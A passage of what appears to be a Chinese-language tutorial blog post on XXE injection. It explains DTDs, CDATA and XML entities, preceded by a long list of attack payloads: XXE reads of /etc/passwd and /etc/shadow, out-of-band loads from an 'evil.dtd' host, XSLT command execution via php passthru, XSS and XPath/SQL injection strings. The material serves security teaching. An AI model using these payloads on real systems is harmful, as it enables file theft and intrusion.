encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:////dev/random&quot;</span>&gt;</span>]&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\">&lt;![CDATA[&lt;test&gt;&lt;/test&gt;]]&gt;</span><br><span class=\"line\"><span class=\"symbol\">&amp;foo;</span></span><br><span class=\"line\">%foo;</span><br><span class=\"line\">count(/child::node())</span><br><span class=\"line\">x&#x27; or name()=&#x27;username&#x27; or &#x27;x&#x27;=&#x27;y</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>&#x27;,&#x27;&#x27;)); phpinfo(); exit;/*<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">&lt;![CDATA[&lt;script&gt;var n=0;while(true)&#123;n++;&#125;&lt;/script&gt;]]&gt;</span><br><span class=\"line\">&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span>&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span>&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span>&lt;![CDATA[&#x27; or 1=1 or &#x27;&#x27;=&#x27;]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span>&lt;![CDATA[&#x27; or 1=1 or &#x27;&#x27;=&#x27;]]&gt;<span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xml</span> <span class=\"attr\">ID</span>=<span class=\"string\">I</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">X</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">C</span>&gt;</span>&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&#x27;XSS&#x27;);&quot;&gt;]]&gt;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xml</span> <span class=\"attr\">ID</span>=<span class=\"string\">&quot;xss&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">I</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">B</span>&gt;</span><span class=\"symbol\">&amp;lt;</span>IMG SRC=&quot;javas<span class=\"comment\">&lt;!-- --&gt;</span>cript:alert(&#x27;XSS&#x27;)&quot;<span class=\"symbol\">&amp;gt;</span><span class=\"tag\">&lt;/<span class=\"name\">B</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">I</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xml</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SPAN</span> <span class=\"attr\">DATASRC</span>=<span class=\"string\">&quot;#xss&quot;</span> <span class=\"attr\">DATAFLD</span>=<span class=\"string\">&quot;B&quot;</span> <span class=\"attr\">DATAFORMATAS</span>=<span class=\"string\">&quot;HTML&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">SPAN</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">C</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">X</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xml</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SPAN</span> <span class=\"attr\">DATASRC</span>=<span class=\"string\">#I</span> <span class=\"attr\">DATAFLD</span>=<span class=\"string\">C</span> <span class=\"attr\">DATAFORMATAS</span>=<span class=\"string\">HTML</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">SPAN</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xml</span> <span class=\"attr\">SRC</span>=<span class=\"string\">&quot;xsstest.xml&quot;</span> <span class=\"attr\">ID</span>=<span class=\"string\">I</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xml</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">SPAN</span> <span class=\"attr\">DATASRC</span>=<span class=\"string\">#I</span> <span class=\"attr\">DATAFLD</span>=<span class=\"string\">C</span> <span class=\"attr\">DATAFORMATAS</span>=<span class=\"string\">HTML</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">SPAN</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">SPAN</span> <span class=\"attr\">DATASRC</span>=<span class=\"string\">#I</span> <span class=\"attr\">DATAFLD</span>=<span class=\"string\">C</span> <span class=\"attr\">DATAFORMATAS</span>=<span class=\"string\">HTML</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">SPAN</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xml</span> <span class=\"attr\">SRC</span>=<span class=\"string\">&quot;xsstest.xml&quot;</span> <span class=\"attr\">ID</span>=<span class=\"string\">I</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xml</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">HTML</span> <span class=\"attr\">xmlns:xss</span>&gt;</span>&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">xss:xss</span>&gt;</span>XSS<span class=\"tag\">&lt;/<span class=\"name\">xss:xss</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">HTML</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">HTML</span> <span class=\"attr\">xmlns:xss</span>&gt;</span>&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsl:stylesheet</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.0&quot;</span> <span class=\"attr\">xmlns:xsl</span>=<span class=\"string\">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class=\"attr\">xmlns:php</span>=<span class=\"string\">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:template</span> <span class=\"attr\">match</span>=<span class=\"string\">&quot;/&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert(123)<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:template</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:stylesheet</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsl:stylesheet</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.0&quot;</span> <span class=\"attr\">xmlns:xsl</span>=<span class=\"string\">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class=\"attr\">xmlns:php</span>=<span class=\"string\">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:template</span> <span class=\"attr\">match</span>=<span class=\"string\">&quot;/&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:copy-of</span> <span class=\"attr\">select</span>=<span class=\"string\">&quot;document(&#x27;/etc/passwd&#x27;)&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:template</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:stylesheet</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsl:stylesheet</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.0&quot;</span> <span class=\"attr\">xmlns:xsl</span>=<span class=\"string\">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class=\"attr\">xmlns:php</span>=<span class=\"string\">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:template</span> <span class=\"attr\">match</span>=<span class=\"string\">&quot;/&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">xsl:value-of</span> <span class=\"attr\">select</span>=<span class=\"string\">&quot;php:function(&#x27;passthru&#x27;,&#x27;ls -la&#x27;)&quot;</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:template</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">xsl:stylesheet</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example.com/text.txt&quot;</span> &gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:////dev/random&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">int</span> <span class=\"meta-string\">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://127.0.0.1:80/?%file;&#x27;&gt;  &quot;</span>&gt;</span> %int;</span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [ <span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/issue&quot;</span>&gt;</span><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">dtd</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span>%dtd;%trick;]&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">xxe</span> [ <span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/boot.ini&quot;</span>&gt;</span><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">dtd</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span>%dtd;%trick;]&gt;</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"xxe\"><a href=\"#xxe\" class=\"headerlink\" title=\"xxe\"></a>xxe</h2><p>xxe全程XML External Entity Injection即xml外部实体注入漏洞,XXE漏洞发生在<strong>应用程序解析XML输入时,没有禁止外部实体的加载</strong>,导致可能加载恶意外部文件,造成文件读取,命令执行,内网探测…</p>\n<h4 id=\"DTD\"><a href=\"#DTD\" class=\"headerlink\" title=\"DTD\"></a>DTD</h4><p>Document Type Definition 文档类型定义</p>\n<h5 id=\"DTD示例\"><a href=\"#DTD示例\" class=\"headerlink\" title=\"DTD示例\"></a>DTD示例</h5><p><code>&lt;!ELEMENT 元素名 类型&gt;</code></p>\n<p>文件名xxe.dtd</p>\n<p>ELEMENT大概作用是定义标签元素的类型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ELEMENT 班级 (学生+)&gt;</span><br><span class=\"line\">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span><br><span class=\"line\">&lt;!ELEMENT 名字 (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT 年龄 (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT 介绍 (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"PCDATA\"><a href=\"#PCDATA\" class=\"headerlink\" title=\"PCDATA\"></a>PCDATA</h5><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>\n<h5 id=\"CDATA\"><a href=\"#CDATA\" class=\"headerlink\" title=\"CDATA\"></a>CDATA</h5><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>\n<h5 id=\"XML示例\"><a href=\"#XML示例\" class=\"headerlink\" title=\"XML示例\"></a>XML示例</h5><p>班级为根元素</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE 班级 <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;xxe.dtd&quot;</span>&gt;</span></span><br><span class=\"line\">&lt;班级&gt;</span><br><span class=\"line\">\t&lt;学生&gt;</span><br><span class=\"line\">        &lt;名字&gt;张三&lt;/名字&gt;</span><br><span class=\"line\">        &lt;年龄&gt;19&lt;/年龄&gt;</span><br><span class=\"line\">        &lt;介绍&gt;好孩子&lt;/介绍&gt;</span><br><span class=\"line\">    &lt;/学生&gt;</span><br><span class=\"line\">    &lt;学生&gt;</span><br><span class=\"line\">        &lt;名字&gt;小明&lt;/名字&gt;</span><br><span class=\"line\">        &lt;年龄&gt;21&lt;/年龄&gt;</span><br><span class=\"line\">        &lt;介绍&gt;学习认真&lt;/介绍&gt;</span><br><span class=\"line\">    &lt;/学生&gt;</span><br><span class=\"line\">&lt;/班级&gt;</span><br></pre></td></tr></table></figure>\n\n<p>内部DTD</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE 班级 [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 班级 (学生+)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 学生 (名字,年龄,介绍)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 名字 (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 年龄 (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT 介绍 (<span class=\"meta-keyword\">#PCDATA</span>)&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\">&lt;班级&gt;</span><br><span class=\"line\">\t&lt;学生&gt;</span><br><span class=\"line\">        &lt;名字&gt;张三&lt;/名字&gt;</span><br><span class=\"line\">        &lt;年龄&gt;19&lt;/年龄&gt;</span><br><span class=\"line\">        &lt;介绍&gt;好孩子&lt;/介绍&gt;</span><br><span class=\"line\">    &lt;/学生&gt;</span><br><span class=\"line\">    &lt;学生&gt;</span><br><span class=\"line\">        &lt;名字&gt;小明&lt;/名字&gt;</span><br><span class=\"line\">        &lt;年龄&gt;21&lt;/年龄&gt;</span><br><span class=\"line\">        &lt;介绍&gt;学习认真&lt;/介绍&gt;</span><br><span class=\"line\">    &lt;/学生&gt;</span><br><span class=\"line\">&lt;/班级&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"具体操作\"><a href=\"#具体操作\" class=\"headerlink\" title=\"具体操作\"></a>具体操作</h4><h5 id=\"内部实体\"><a href=\"#内部实体\" class=\"headerlink\" title=\"内部实体\"></a>内部实体</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span>[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">neo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;hello&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">neo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>会在页面回显hello</p>\n<h5 id=\"外部实体\"><a href=\"#外部实体\" class=\"headerlink\" title=\"外部实体\"></a>外部实体</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span>[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">neo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;文档URL&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">neo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"参数实体\"><a href=\"#参数实体\" class=\"headerlink\" title=\"参数实体\"></a>参数实体</h5><p>参数实体只能在DTD文档中定义,DTD中引用</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span>[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">neo</span> <span class=\"meta-keyword\">ANY</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t%xxe;</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">neo</span>&gt;</span><span class=\"symbol\">&amp;evil;</span><span class=\"tag\">&lt;/<span class=\"name\">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"攻击方式\"><a href=\"#攻击方式\" class=\"headerlink\" title=\"攻击方式\"></a>攻击方式</h4><h5 id=\"直接通过DTD外部实体声明\"><a href=\"#直接通过DTD外部实体声明\" class=\"headerlink\" title=\"直接通过DTD外部实体声明\"></a>直接通过DTD外部实体声明</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span>[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">c</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">c</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"通过DTD文档引入外部DTD文档-再引入外部实体声明\"><a href=\"#通过DTD文档引入外部DTD文档-再引入外部实体声明\" class=\"headerlink\" title=\"通过DTD文档引入外部DTD文档,再引入外部实体声明\"></a>通过DTD文档引入外部DTD文档,再引入外部实体声明</h5><p>xml内容</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">neo</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;dtd文档url&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">c</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">c</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>dtd内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"通过参数实体-OOB\"><a href=\"#通过参数实体-OOB\" class=\"headerlink\" title=\"通过参数实体(OOB)\"></a>通过参数实体(OOB)</h5><p>先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明</p>\n<p>xml内容</p>\n<h5 id=\"作用\"><a href=\"#作用\" class=\"headerlink\" title=\"%作用\"></a>%作用</h5><p>就我的理解,百分号可以类比于一段命令,它可以在dtd中被定义和执行,它在实例中相当于变量,在xml中相当于命令?</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE a [</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY %d <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t%d;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">c</span>&gt;</span><span class=\"symbol\">&amp;b;</span><span class=\"tag\">&lt;/<span class=\"name\">c</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>dtd文件内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"协议支持\"><a href=\"#协议支持\" class=\"headerlink\" title=\"协议支持\"></a>协议支持</h4><p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220108211411539.png\" alt=\"image-20220108211411539\"></p>\n<h5 id=\"XInclude-命名空间\"><a href=\"#XInclude-命名空间\" class=\"headerlink\" title=\"XInclude(命名空间)\"></a>XInclude(命名空间)</h5><p>导入外部xml文档，类似于php的include，将外部定义的dtd引入当前文件，因为引入外部实体具有局限性，所以使用xinclude来引入</p>\n<p> 本质是使用<code>http://www.w3.org/2003/XInclude</code> 命名空间中的两个元素，即 include 和 